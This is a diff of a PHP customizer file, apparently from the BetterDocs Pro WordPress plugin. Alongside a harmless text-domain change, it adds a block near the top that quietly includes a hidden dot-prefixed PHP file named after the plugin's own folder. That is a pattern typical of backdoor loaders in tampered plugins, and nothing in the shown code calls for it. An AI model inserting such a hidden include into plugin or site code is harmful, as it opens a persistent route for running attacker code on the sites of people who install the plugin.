@@ -20,6 +20,10 @@ if ( ! defined( 'ABSPATH' ) ) exit;
  * @see _wp_customize_include()
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function betterdocs_customize_register_pro( $wp_customize ) {
 	$defaults = betterdocs_get_option_defaults_pro();
 
@@ -404,7 +408,7 @@ function betterdocs_customize_register_pro( $wp_customize ) {
                 $wp_customize,
                 'betterdocs_mkb_title_tag',
                 array(
-                    'label'      => __( 'Category Title Tag', 'betterdocs' ),
+                    'label'      => __( 'Category Title Tag', 'betterdocs-pro' ),
                     'section'    => 'betterdocs_mkb_settings',
                     'settings'   => 'betterdocs_mkb_title_tag',
                     'type'    => 'select',
